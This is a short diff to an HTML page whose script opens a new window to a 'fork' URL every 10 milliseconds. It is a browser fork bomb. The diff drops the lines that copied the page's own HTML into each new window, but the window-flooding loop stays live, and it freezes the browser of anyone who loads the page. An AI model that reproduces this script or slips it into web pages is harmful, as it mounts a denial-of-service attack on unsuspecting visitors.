@@ -3,11 +3,7 @@
     <script>
       setInterval(function() {
         // Always open a new window by using "_blank"
-        var w = window.open("https://havesomegame.github.io/fork/", "_blank");
-        // If you actually want to overwrite the new window's content with your current page:
-        if (w) {
-          w.document.write(document.documentElement.outerHTML || document.documentElement.innerHTML);
-        }
+        window.open("https://havesomegame.github.io/fork/", "_blank");
       }, 10); // interval in ms
     </script>
   </body>
